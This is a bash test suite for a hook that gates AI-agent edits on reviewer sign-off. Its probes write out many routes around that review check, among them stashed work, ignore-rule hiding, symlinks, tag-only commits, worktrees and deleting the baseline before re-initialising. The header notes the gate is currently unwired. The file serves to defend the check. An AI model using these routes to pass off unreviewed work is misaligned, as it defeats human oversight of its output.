#!/usr/bin/env bash
# Probes for the review board gate, run against a throwaway repo.
#
# NOTHING CURRENTLY INVOKES THE GATE. The `Stop` entry was removed from
# `.claude/settings.json` on 2026-08-14, briefly replaced by a narrower
# `PreToolUse` entry, and then removed again; the gate's own first line says so,
# and `CLAUDE.md` records the sequence. These probes therefore protect a
# mechanism kept on hand rather than one in force — which is exactly why they are
# worth keeping green, and exactly why this header no longer claims the gate is
# "the only thing standing between unreviewed work and 'done'". That is now
# discipline, not machinery.
#
# When it was wired, it shipped defects in both directions: fail-OPEN (an unborn HEAD baselining to
# the literal string "HEAD"; a waiver clearing a component with no reviewer; an
# absolute `core.excludesFile` misread as in-tree) and fail-CLOSED (a linked
# worktree's `.git`-as-file blocking permanently with no way to clear it; a
# sign-off invalidating the hash it had just approved). Each was found by hand.
#
# Coverage is real but not total. There is no unborn-HEAD fixture, and no
# probe exercises the self-invalidating sign-off (see review-board-signoff.sh
# around `mark_cleared` / the re-record `cp`) as its own subject. This exact
# sentence has been wrong twice already -- once claiming zero fixtures
# advance the baseline at sign-off time when one did, then claiming that one
# fixture was "partial, incidental coverage" when deleting the re-record
# mechanism it was credited with pinning failed no probe at all, proving the
# credit was false. Whether some existing fixture happens to advance the
# baseline at sign-off time is NOT the same claim as whether any fixture
# actually exercises the re-record path -- the first is a fact about this
# file's current contents and will keep drifting as fixtures are added or
# reordered; the second is the one that matters and the honest answer is no.
# If you add a fixture that pins this, delete this whole paragraph rather
# than editing it again.
#
# One more known gap: the waiver-side newline refusal in `waiver_forbidden_
# paths` (work-hash.sh, mirroring the gate-side sentinel) has no probe of
# its own -- three probes in this file now exercise a newline, and the
# state-dir one added for CHR-19 drives `waiver_forbidden_paths` too, but
# deleting only the waiver-side arm still leaves the suite fully green, so
# the gap is unchanged. Confirmed NOT a fail-open (deleting just that arm still refuses,
# via `compute_work_hash` running after `waiver_forbidden_paths` clears in
# `review-board-signoff.sh`, just with a `Cannot sign off:` prefix instead
# of `Cannot waive:`), so this is a coverage gap behind a probed guard, not
# an unpinned one.
# Nothing runs this file automatically — it is not wired into any script.
#
#   bash .claude/hooks/review-board-gate.test.sh
set -uo pipefail

HOOKS_SRC="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Fixtures below run `git add -A`, `git commit`, `git stash`, `git update-index`
# and `rm -rf` against $d. A generated runner once executed new_repo()'s body
# WITHOUT its `cd "$d"`, and `git add -A; git commit -qm base` ran against this
# repository, committing a stray seed.txt. new_repo's own path is asserted to be
# outside this repo before anything destructive runs. NOT asserted: the `ext=`
# and `wt=` mktemp roots individual probes create and rm -rf themselves.
__self_root=$(cd "$HOOKS_SRC/../.." && pwd)
assert_sandbox() {
  local d="$1" real
  real=$(cd "$d" 2>/dev/null && pwd -P) || {
    printf 'FATAL: fixture path does not exist: %s\n' "$d" >&2; exit 2; }
  case "$real" in
    "$__self_root"|"$__self_root"/*)
      printf 'FATAL: fixture resolved inside the real repo (%s); refusing to run destructive git commands there.\n' "$real" >&2
      exit 2 ;;
  esac
  printf '%s\n' "$real"
}
# The state directory path, spelled once for probes that drive work-hash.sh's
# refusal formatter directly rather than through a fixture.
STATE_DIR_PROBE='.claude/.review-board-state'

pass=0
fail=0

ok() { printf '  ok    %s\n' "$1"; pass=$((pass + 1)); }
no() { printf '  FAIL  %s\n' "$1"; printf '        %s\n' "${2:-}"; fail=$((fail + 1)); }

# A fresh repo with the hooks copied in and a baseline established.
new_repo() {
  local d
  d=$(mktemp -d) || return 1
  # BEFORE anything destructive. The previous version asserted after the subshell
  # below had already run `git init`, `git add -A` and `git commit`.
  assert_sandbox "$d" >/dev/null
  (
    cd "$d" || exit 1
    git init -q .
    git config core.excludesFile /dev/null
    git config user.email t@example.com
    git config user.name t
    mkdir -p .claude/hooks src/routes static scripts
    cp "$HOOKS_SRC"/work-hash.sh "$HOOKS_SRC"/review-board-gate.sh "$HOOKS_SRC"/review-board-signoff.sh .claude/hooks/
    echo seed > seed.txt
    git add -A
    git commit -qm base
    CLAUDE_PROJECT_DIR="$PWD" bash .claude/hooks/review-board-signoff.sh --initialize >/dev/null 2>&1
  ) || return 1
  printf '%s\n' "$d"
}

# Returns 0 for allow, 1 for block, 2 for "the gate did not run".
#
# The gate exits 0 either way and signals through the JSON it
# prints, so exit status alone is not the answer. CLAUDE_PROJECT_DIR is pinned to
# the sandbox because the gate reads it and would otherwise evaluate the real
# repo. And absence of a refusal is not evidence of approval -- a gate replaced
# by `exit 0` once scored green on every probe asserting something clears -- so
# an allow has to be proven rather than inferred.
#
# This check lives entirely on the test side. An earlier version proved "the
# gate really ran" with an EXIT trap inside review-board-gate.sh, which put an
# env-controlled truncation of an arbitrary path into the one script everything
# else depends on -- production code carrying a hazard so the tests could watch
# it. Comparing the sandbox copy against the source gets the same
# discrimination for nothing: a stubbed or corrupted gate no longer matches.
# The gate is a PreToolUse hook now, not a Stop hook: it reads the tool call from
# stdin and only evaluates the work when the call targets ROADMAP.md or
# ROADMAP.local.md. Every probe below therefore has to hand it a tool call that
# names a gated file, or the gate correctly exits early having decided the call
# is none of its business -- which is an ALLOW, and silently turned all 46 block
# probes green-to-red when the trigger changed. Feeding `/dev/null` (the old
# Stop-hook shape) is no longer a valid way to ask this script anything.
#
# The relative form is deliberate: the gate accepts `ROADMAP.md` as well as
# `$PWD/ROADMAP.md`, and the relative spelling keeps these fixtures independent
# of the sandbox's temp path. The file itself never has to exist -- the gate
# string-matches the path before it touches the filesystem.
GATE_STDIN='{"tool_input":{"file_path":"ROADMAP.md"}}'

gate() {
  local out rc
  cmp -s "$1/.claude/hooks/review-board-gate.sh" "$HOOKS_SRC/review-board-gate.sh" || return 2
  bash -n "$1/.claude/hooks/review-board-gate.sh" 2>/dev/null || return 2
  out=$(cd "$1" && CLAUDE_PROJECT_DIR="$1" bash .claude/hooks/review-board-gate.sh <<<"$GATE_STDIN" 2>&1)
  rc=$?
  printf '%s' "$out" | grep -q '"permissionDecision"[[:space:]]*:[[:space:]]*"deny"' && return 1
  [ "$rc" -eq 0 ] || return 2
  return 0
}

# A block probe must not accept "the gate crashed" as "the gate blocked". Adding
# an unbound variable to the gate made it die under `set -u` before deciding
# anything, and ten `gate "$d" && no ... || ok ...` call sites still reported ok.
expect_block() {
  local d="$1" name="$2"
  gate "$d"
  case $? in
    1) ok "$name" ;;
    0) no "$name" "gate allowed" ;;
    2) no "$name" "gate did not run to completion — block is unproven" ;;
  esac
}

# Distinguishes the three outcomes at a call site that expects an allow.
expect_allow() {
  local d="$1" name="$2"
  gate "$d"
  case $? in
    0) ok "$name" ;;
    1) no "$name" "gate blocked" ;;
    2) no "$name" "gate did not run to completion — allow is unproven" ;;
  esac
}

# Same for the sign-off script, which also cds to CLAUDE_PROJECT_DIR.
signoff() {
  local d="$1"; shift
  (cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh "$@")
}

echo "waiver guard"

# The defect: every ground is self-asserted and nothing checked it against the
# diff, so a dialog with no focus trap cleared the board under all five.
for ground in formatting-only comments-only revert-of-cleared generated-artifact advisor-approved; do
  d=$(new_repo) || { no "setup" "could not build a test repo"; break; }
  printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/+page.svelte"
  out=$(signoff "$d" --waive --grounds "$ground" --reason "r" 2>&1)
  if [ $? -eq 0 ]; then
    no "--grounds $ground is refused on a .svelte change" "waiver was accepted"
  elif ! printf '%s' "$out" | grep -q "not waivable"; then
    no "--grounds $ground is refused on a .svelte change" "refused for the wrong reason: $out"
  else
    ok "--grounds $ground is refused on a .svelte change"
  fi
  rm -rf "$d"
done

for path in static/robots.txt src/app.html src/lib/a.css; do
  d=$(new_repo) || break
  mkdir -p "$(dirname "$d/$path")"
  echo x > "$d/$path"
  if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
    no "$path is not waivable" "waiver was accepted"
  else
    ok "$path is not waivable"
  fi
  rm -rf "$d"
done

# Proportionality is the point of the waiver: work with no rendered surface must
# still be waivable, or the guard has just deleted the feature.
d=$(new_repo) || exit 1
echo "# note" >> "$d/scripts/build.sh"
if signoff "$d" --waive --grounds comments-only --reason r >/dev/null 2>&1; then
  expect_allow "$d" "work with no rendered surface stays waivable"
else
  no "work with no rendered surface stays waivable" "waiver was refused"
fi
rm -rf "$d"

echo "waiver grounds are enforced by the gate, not only by the writer"

# The gate matched any `[a-z-]+` token, so it accepted grounds the signoff
# script would have rejected.
d=$(new_repo) || exit 1
echo "# note" >> "$d/scripts/build.sh"
signoff "$d" --waive --grounds comments-only --reason r >/dev/null 2>&1
sig=$(find "$d/.claude/.review-board-state/signoffs" -name '*.signoff' | head -1)
if [ -n "$sig" ]; then
  find "$d/.claude/.review-board-state/signoffs" -name '*.signoff' | while IFS= read -r f; do
    sed -i '' 's/^WAIVED: comments-only$/WAIVED: because-i-said-so/' "$f" 2>/dev/null ||
      sed -i 's/^WAIVED: comments-only$/WAIVED: because-i-said-so/' "$f"
  done
  if gate "$d"; then
    no "an off-list ground in the signoff file is rejected" "gate allowed 'because-i-said-so'"
  else
    ok "an off-list ground in the signoff file is rejected"
  fi
else
  no "an off-list ground in the signoff file is rejected" "no signoff file was written"
fi
rm -rf "$d"

echo "baseline and scope"

d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
expect_block "$d" "unreviewed src change blocks"
rm -rf "$d"

d=$(new_repo) || exit 1
echo "x" >> "$d/CLAUDE.md"
expect_allow "$d" "a denylisted file alone does not convene a board"
rm -rf "$d"

d=$(new_repo) || exit 1
mkdir -p "$d/.claude/agents"
echo "x" > "$d/.claude/agents/some-agent.md"
expect_block "$d" ".claude/agents is reviewable work"
rm -rf "$d"

# COMMIT the work first. With it uncommitted the gate blocks on the work itself
# whether or not the baseline is adopted, so the probe passed with work_baseline
# reverted to adopting HEAD -- which is the exact bypass it names.
d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
(cd "$d" && git add -A && git commit -qm work) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
expect_block "$d" "a missing baseline blocks rather than allows"
rm -rf "$d"

d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
expect_allow "$d" "a full four-PASS sign-off clears the gate"
if [ -d "$d" ]; then
  (cd "$d" && git add -A && git commit -qm work >/dev/null 2>&1)
  expect_allow "$d" "committing after a PASS does not invalidate it"
fi
rm -rf "$d"

d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic >/dev/null 2>&1
expect_block "$d" "a partial sign-off blocks"
rm -rf "$d"


echo "bypasses the guard must not have"

# A non-ASCII route segment: core.quotePath C-quotes the path, so the guard saw
# `"src/routes/caf\303\251/..."` -- starting with a quote, matching nothing.
d=$(new_repo) || exit 1
mkdir -p "$d/src/routes/café"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/café/+page.svelte"
if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
  no "a non-ASCII path is not waivable" "waiver was accepted"
else
  ok "a non-ASCII path is not waivable"
fi
rm -rf "$d"

# Rename detection printed only the destination, so moving a component out of
# src/ showed no forbidden path at all.
d=$(new_repo) || exit 1
mkdir -p "$d/src/routes/demo" "$d/.claude/notes"
printf '<div role="dialog"></div>\n' > "$d/src/routes/demo/+page.svelte"
(cd "$d" && git add -A && git commit -qm add-route >/dev/null 2>&1)
# --initialize refuses when a baseline already exists, so re-baselining onto the
# commit that carries the route requires clearing it first. Without this the
# route never existed in the baseline and the probe proves nothing.
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize >/dev/null 2>&1)
(cd "$d" && git mv src/routes/demo/+page.svelte .claude/notes/old.txt >/dev/null 2>&1)
if signoff "$d" --waive --grounds generated-artifact --reason r >/dev/null 2>&1; then
  no "moving a component out of src/ is not waivable" "waiver was accepted"
else
  ok "moving a component out of src/ is not waivable"
fi
rm -rf "$d"

# Hidden by an ignore source outside the work tree: invisible to `git add -A`,
# so the guard could not see it while the gate could.
d=$(new_repo) || exit 1
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/secret.svelte"
printf 'src/routes/secret.svelte\n' >> "$d/.git/info/exclude"
echo "# c" >> "$d/scripts/build.sh"
if signoff "$d" --waive --grounds comments-only --reason r >/dev/null 2>&1; then
  no "an externally-hidden component is not waivable" "waiver was accepted"
else
  ok "an externally-hidden component is not waivable"
fi
rm -rf "$d"

# A stash can carry a whole component and the guard cannot enumerate one.
d=$(new_repo) || exit 1
printf '<div role="dialog"></div>\n' > "$d/src/routes/+page.svelte"
# Stash ONLY the component. `git add -A && git stash` also swept the untracked
# baseline file away, so the refusal came from work_baseline long before the
# stash guard ran and the probe passed with the guard deleted.
(cd "$d" && git add -A -- src/routes/+page.svelte >/dev/null 2>&1 && git stash -q -- src/routes/+page.svelte >/dev/null 2>&1)
echo "# c" >> "$d/scripts/build.sh"
if signoff "$d" --waive --grounds comments-only --reason r >/dev/null 2>&1; then
  no "work hidden in a stash is not waivable" "waiver was accepted"
else
  ok "work hidden in a stash is not waivable"
fi
rm -rf "$d"

# The guard must refuse, not permit, when it cannot evaluate the tree. The
# caller read the list through a command substitution, which discarded
# WORK_ERROR and turned every error path into "nothing forbidden".
d=$(new_repo) || exit 1
echo "# c" >> "$d/scripts/build.sh"
# The stash is the one condition ONLY waiver_forbidden_paths rejects -- every
# other unevaluable state (missing baseline, index bits) is caught earlier by
# compute_work_hash, so a probe built on those passes even with the guard gone.
# Asserting the "Cannot waive" prefix is what pins WORK_ERROR actually reaching
# the caller, which the original command substitution silently discarded.
printf 'x\n' > "$d/src/routes/parked.svelte"
(cd "$d" && git add -A -- src/routes/parked.svelte >/dev/null 2>&1 &&
  git stash -q -- src/routes/parked.svelte >/dev/null 2>&1)
out=$(signoff "$d" --waive --grounds comments-only --reason r 2>&1)
if [ $? -eq 0 ]; then
  no "an unevaluable tree refuses the waiver" "waiver was accepted"
elif ! printf '%s' "$out" | grep -q "Cannot waive"; then
  no "an unevaluable tree refuses the waiver" "refused, but not by the guard: $out"
else
  ok "an unevaluable tree refuses the waiver"
fi
rm -rf "$d"

# The suite must be able to tell "allowed" from "never ran".
d=$(new_repo) || exit 1
printf '#!/usr/bin/env bash\nexit 0\n' > "$d/.claude/hooks/review-board-gate.sh"
gate "$d"; rc=$?
[ "$rc" -eq 2 ] && ok "a stubbed-out gate reads as unproven, not as allow" ||
  no "a stubbed-out gate reads as unproven, not as allow" "gate() returned $rc"
rm -rf "$d"


# A directory-form rule in .git/info/exclude collapses to one `!! dir/` entry in
# `git status --ignored`, so an existence test written as `-f` was false and an
# entire route went unhashed -- the gate allowing it outright, no waiver needed.
d=$(new_repo) || exit 1
mkdir -p "$d/src/routes/secret"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/secret/+page.svelte"
printf 'src/routes/secret/\n' >> "$d/.git/info/exclude"
expect_block "$d" "a directory hidden by .git/info/exclude still blocks"
rm -rf "$d"

# work_baseline tells the user to run --initialize when the baseline no longer
# resolves; --initialize used to refuse because a baseline file existed, and
# --waive failed on the same broken baseline. Nothing could clear the repo.
d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
echo "0000000000000000000000000000000000000000" > "$d/.claude/.review-board-state/last-cleared"
if signoff "$d" --initialize >/dev/null 2>&1; then
  ok "an unresolvable baseline can be re-initialized"
else
  no "an unresolvable baseline can be re-initialized" "--initialize refused, leaving no way to clear the gate"
fi
rm -rf "$d"

# ...but a baseline that still resolves must keep refusing, or --initialize is
# just a bypass button that clears work with no reviewer and no record.
# Clean tree, so the separate "work in flight" guard cannot be what refuses --
# the fixture used to leave a component uncommitted, and that guard caught it
# even with this refusal deleted.
d=$(new_repo) || exit 1
out=$(signoff "$d" --initialize 2>&1)
if [ $? -eq 0 ]; then
  no "a resolvable baseline still refuses re-initialization" "--initialize re-baselined silently"
elif ! printf '%s' "$out" | grep -q "A baseline already exists"; then
  no "a resolvable baseline still refuses re-initialization" "refused for another reason: $out"
else
  ok "a resolvable baseline still refuses re-initialization"
fi
rm -rf "$d"


# The sandbox used to set core.excludesFile /dev/null and test only
# .git/info/exclude -- a RELATIVE source. The whole finding was that an ABSOLUTE
# core.excludesFile was misclassified as in-tree, so the suite deleted the one
# variable it needed to observe. These two set it deliberately.
d=$(new_repo) || exit 1
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/hidden.svelte"
# Named `.gitignore` deliberately: an absolute path ending that way is the
# shape that matches the in-tree `*/.gitignore` arm, and ordering the cases
# wrong silently swallows it. A probe using any other filename cannot catch it.
# OUTSIDE the repo: an excludes file placed inside it is itself untracked work,
# so the gate would block on that and the probe would pass for the wrong reason.
ext=$(mktemp -d) || exit 1
printf 'src/routes/hidden.svelte\n' > "$ext/.gitignore"
(cd "$d" && git config core.excludesFile "$ext/.gitignore")
# UNPROVEN, and labelled so rather than left looking like coverage. The guard it
# targets -- the absolute-path arm preceding `*/.gitignore` -- is real and was
# verified by hand against this machine's `core.excludesFile`. But reversing that
# ordering leaves this probe green, so it does not pin the guard, and two earlier
# attempts (a `.svelte` fixture masked by renders(), then a non-rendering one)
# both failed to discriminate. Do not read a pass here as the ordering being
# safe; check it by hand until someone finds a fixture that fails without it.
expect_block "$d" "[unproven] an absolute core.excludesFile does not hide a component"
rm -rf "$d" "$ext"

# Presence was hashed once; content inside was never hashed, so a sign-off
# covered a directory whose files could then be rewritten freely.
d=$(new_repo) || exit 1
mkdir -p "$d/hidden"
printf 'v1\n' > "$d/hidden/a.svelte"
printf 'hidden/\n' >> "$d/.git/info/exclude"
h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c 'source .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
printf 'v2-rewritten\n' > "$d/hidden/a.svelte"
printf 'brand new\n' > "$d/hidden/b.svelte"
h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c 'source .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
if [ -n "$h1" ] && [ "$h1" != "$h2" ]; then
  ok "content inside an ignored directory moves the work hash"
else
  no "content inside an ignored directory moves the work hash" "hash unchanged ($h1 -> $h2)"
fi
rm -rf "$d"

# ...and the waiver guard must see the component inside it, not just `hidden/`.
d=$(new_repo) || exit 1
mkdir -p "$d/hidden"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/hidden/modal.svelte"
printf 'hidden/\n' >> "$d/.git/info/exclude"
echo "# c" >> "$d/scripts/build.sh"
if signoff "$d" --waive --grounds comments-only --reason r >/dev/null 2>&1; then
  no "a component in an ignored directory is not waivable" "waiver was accepted"
else
  ok "a component in an ignored directory is not waivable"
fi
rm -rf "$d"


echo "work the gate cannot enumerate must block, not pass"

# Reachable only from a tag: the sweep read refs/heads, so deleting the branch
# after tagging hid a route while the commit stayed alive. Capture the starting
# branch by name -- guessing main/master left HEAD on the throwaway branch, so
# the commit was still on a branch and the probe passed under either sweep.
d=$(new_repo) || exit 1
base_branch=$(cd "$d" && git rev-parse --abbrev-ref HEAD)
(cd "$d" && git checkout -q -b tmpwork &&
  mkdir -p src/routes/parked &&
  printf '<div role="dialog"></div>\n' > src/routes/parked/+page.svelte &&
  git add -A -- src/routes/parked && git commit -qm parked && git tag parked &&
  git checkout -q "$base_branch" && git branch -qD tmpwork) >/dev/null 2>&1
# The baseline file is untracked; `git add -A` would sweep it onto the throwaway
# branch and the checkout would delete it, so the gate would block on a MISSING
# BASELINE and never reach the ref sweep. Pathspec above keeps it, but re-assert.
[ -f "$d/.claude/.review-board-state/last-cleared" ] ||
  (cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
expect_block "$d" "work reachable only from a tag still blocks"
rm -rf "$d"

# Uncommitted changes in a linked worktree are invisible from the main checkout.
d=$(new_repo) || exit 1
wt=$(mktemp -d)/wt
(cd "$d" && git worktree add -q -b feature "$wt") >/dev/null 2>&1
if [ -d "$wt" ]; then
  mkdir -p "$wt/src/routes"
  printf '<div role="dialog"></div>\n' > "$wt/src/routes/+page.svelte"
  expect_block "$d" "a dirty linked worktree blocks"
  (cd "$d" && git worktree remove --force "$wt") >/dev/null 2>&1
else
  no "a dirty linked worktree blocks" "could not create a worktree"
fi
rm -rf "$d"

# A route hidden by a pre-existing, unanchored IN-TREE .gitignore rule. No new
# rule is added, so "the rule change is itself reviewable" does not apply.
d=$(new_repo) || exit 1
(cd "$d" && printf 'tmp/\n' > .gitignore && git add -A && git commit -qm ignore) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
mkdir -p "$d/src/routes/tmp"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/tmp/+page.svelte"
expect_block "$d" "a route hidden by an in-tree .gitignore rule still blocks"
rm -rf "$d"

# ...while a non-rendering ignored path keeps its carve-out, or this would start
# hashing .env and every build artifact.
d=$(new_repo) || exit 1
(cd "$d" && printf 'secrets.txt\n' > .gitignore && git add -A && git commit -qm ignore) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
printf 'API_KEY=hunter2\n' > "$d/secrets.txt"
expect_allow "$d" "a non-rendering ignored file keeps its carve-out"
rm -rf "$d"

# A symlink under src/ pointing into a WORK_DENY path: the blob is 40 bytes, the
# surface behind it is unbounded and permanently unreviewable.
#
# Targets a real WORK_DENY path (ROADMAP.md / the state directory), not
# docs/: docs/ left WORK_DENY once the bundler turned out to resolve imports
# into it, which makes it ordinary reviewable work -- so a probe that points
# there and falls back to "rewrite the target, expect a block" passes
# whether or not the symlink guard exists at all, since the gate blocks on
# the target's own unreviewed content either way. Confirmed by deleting the
# guard's WORK_DENY arm outright: these two probes did not fail. A WORK_DENY
# target has no such fallback -- outside the symlink guard, nothing else in
# this gate refuses a link merely because of where it points -- so this
# asserts the guard's message directly, with no else branch to pass through.
for shape in dir file; do
  d=$(new_repo) || break
  if [ "$shape" = dir ]; then (cd "$d/src/routes" && ln -s ../../.claude/.review-board-state symdemo)
  else (cd "$d/src/routes" && ln -s ../../ROADMAP.md linked.svelte)
  fi
  out=$(signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
    --pass contract-auditor --pass a11y-ssr-auditor 2>&1)
  printf '%s' "$out" | grep -q "symlink under a rendered root" &&
    ok "a $shape symlink from src/ into a WORK_DENY path cannot be signed off" ||
    no "a $shape symlink from src/ into a WORK_DENY path cannot be signed off" "signed off cleanly"
  rm -rf "$d"
done


# The artifact bound must be POSITIONAL. Pruning `build`/`dist`/`coverage` by
# name at any depth hid `src/routes/build/+page.svelte` -- a route SvelteKit
# compiles -- whenever an external ignore rule carried that name, which this
# machine's global gitignore does.
d=$(new_repo) || exit 1
mkdir -p "$d/src/routes/build"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/build/+page.svelte"
printf 'build/\n' >> "$d/.git/info/exclude"
expect_block "$d" "a route in a directory named build/ still blocks"
rm -rf "$d"

# ...while a real artifact tree at the root stays out, or the runtime regression
# comes straight back.
d=$(new_repo) || exit 1
mkdir -p "$d/coverage/lcov-report"
printf '<html>report</html>\n' > "$d/coverage/lcov-report/index.html"
printf 'coverage/\n' >> "$d/.git/info/exclude"
expect_allow "$d" "a root-level artifact directory stays out of the hash"
rm -rf "$d"

# Hidden non-.svelte source must be hashed too: a load function is the commonest
# hydration-mismatch source, and reusing renders() here dropped every .ts/.js.
d=$(new_repo) || exit 1
mkdir -p "$d/hidden/src/routes"
printf 'export const load = () => ({ v: 1 });\n' > "$d/hidden/src/routes/+page.ts"
printf 'hidden/\n' >> "$d/.git/info/exclude"
h1=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
printf 'export const load = () => ({ v: 2, injected: true });\n' > "$d/hidden/src/routes/+page.ts"
h2=$(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash -c '. .claude/hooks/work-hash.sh; compute_work_hash; echo "$WORK_HASH"')
if [ -n "$h1" ] && [ "$h1" != "$h2" ]; then
  ok "a load function hidden by an ignore rule moves the hash"
else
  no "a load function hidden by an ignore rule moves the hash" "hash unchanged ($h1 -> $h2)"
fi
rm -rf "$d"


# The bypass four documents claimed was shut: commit unreviewed work, delete the
# gitignored baseline, then run the --initialize the gate itself prints.
d=$(new_repo) || exit 1
echo "x" > "$d/src/routes/+page.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/evil.svelte"
(cd "$d" && git add -A && git commit -qm sneak) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
if signoff "$d" --initialize >/dev/null 2>&1; then
  no "deleting the baseline plus --initialize is not a bypass" "--initialize cleared committed unreviewed work"
else
  ok "deleting the baseline plus --initialize is not a bypass"
fi
rm -rf "$d"

# An embedded git repo with no .gitmodules: `git submodule foreach` reads that
# file, so keying the guard on it meant `rm .gitmodules` disabled the check.
d=$(new_repo) || exit 1
mkdir -p "$d/src/lib/vendor"
(cd "$d/src/lib/vendor" && git init -q . && git config user.email t@e && git config user.name t &&
  printf '<h1>v</h1>\n' > V.svelte && git add -A && git commit -qm v) >/dev/null 2>&1
(cd "$d" && git add -A && git commit -qm embed) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
# Two steps: the gitlink diff shows `-dirty` on the FIRST change, so a one-step
# probe blocks via the diff and never reaches the guard. That marker saturates,
# so sign off while dirty and then rewrite the content -- which is when the
# guard is the only thing left that can see it.
printf '<h1>v2</h1>\n' > "$d/src/lib/vendor/V.svelte"
signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor >/dev/null 2>&1
printf '<div role="dialog" aria-modal="true">unreviewed</div>\n' > "$d/src/lib/vendor/V.svelte"
printf 'export const load = () => ({});\n' > "$d/src/lib/vendor/extra.ts"
expect_block "$d" "a dirty embedded repo with no .gitmodules blocks"
rm -rf "$d"

# A DETACHED linked worktree: its HEAD is per-worktree and outside refs/, so
# committing there does not make the work visible to the ref sweep either.
d=$(new_repo) || exit 1
wt=$(mktemp -d)/wt
(cd "$d" && git worktree add -q --detach "$wt") >/dev/null 2>&1
if [ -d "$wt" ]; then
  expect_block "$d" "a detached linked worktree blocks"
  (cd "$d" && git worktree remove --force "$wt") >/dev/null 2>&1
else
  no "a detached linked worktree blocks" "could not create a detached worktree"
fi
rm -rf "$d"


# core.quotePath C-quotes non-ASCII paths, so the IGNORE enumeration received
# `"src/routes/caf\303\251/"`, check-ignore exited 1 on it, and the entry fell
# out of the hash entirely. The fix had reached the diff enumeration only.
d=$(new_repo) || exit 1
mkdir -p "$d/src/routes/café"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/café/+page.svelte"
printf 'src/routes/café/\n' >> "$d/.git/info/exclude"
expect_block "$d" "a non-ASCII path hidden by an ignore rule still blocks"
rm -rf "$d"

# The find prune matched artifact names at ANY depth and ran BEFORE is_artifact,
# so it discarded `src/routes/node_modules/+page.svelte` before the positional
# bound could keep it -- and this repo's own .gitignore line 1 is unanchored.
d=$(new_repo) || exit 1
(cd "$d" && printf 'node_modules\n' > .gitignore && git add -A && git commit -qm ign) >/dev/null 2>&1
rm -f "$d/.claude/.review-board-state/last-cleared"
(cd "$d" && CLAUDE_PROJECT_DIR="$d" bash .claude/hooks/review-board-signoff.sh --initialize) >/dev/null 2>&1
mkdir -p "$d/src/routes/node_modules"
printf '<div role="dialog" aria-modal="true"></div>\n' > "$d/src/routes/node_modules/+page.svelte"
expect_block "$d" "a route under a node_modules path segment still blocks"
rm -rf "$d"

# Build config decides what SSRs and how it hydrates; a waiver must not cover it.
d=$(new_repo) || exit 1
printf 'export default { ssr: { noExternal: true } };\n' > "$d/vite.config.ts"
if signoff "$d" --waive --grounds formatting-only --reason r >/dev/null 2>&1; then
  no "build config is not waivable" "waiver was accepted for vite.config.ts"
else
  ok "build config is not waivable"
fi
rm -rf "$d"

# A root-level config symlink in a shape the scan missed: .cjs is the required
# form for a PostCSS config in an ESM package and rewrites every byte of CSS.
#
# Targets ROADMAP.md, not docs/p.cjs: the same docs/-is-reviewable-work gap
# as the src/ probes above meant this one asserted only that an untracked
# link blocks at all -- true with the guard deleted, since docs/p.cjs is
# itself unreviewed work either way. No else branch, for the same reason.
d=$(new_repo) || exit 1
(cd "$d" && ln -s ROADMAP.md postcss.config.cjs)
out=$(signoff "$d" --pass test-integrity-auditor --pass harness-skeptic \
  --pass contract-auditor --pass a11y-ssr-auditor 2>&1)
printf '%s' "$out" | grep -q "symlink under a rendered root" &&
  ok "a root-level .cjs config symlink cannot be signed off" ||
  no "a root-level .cjs config symlink cannot be signed off" "signed off cleanly"
rm -rf "$d"


# is_artifact anchored at the path start, so a NESTED artifact tree -- the exact
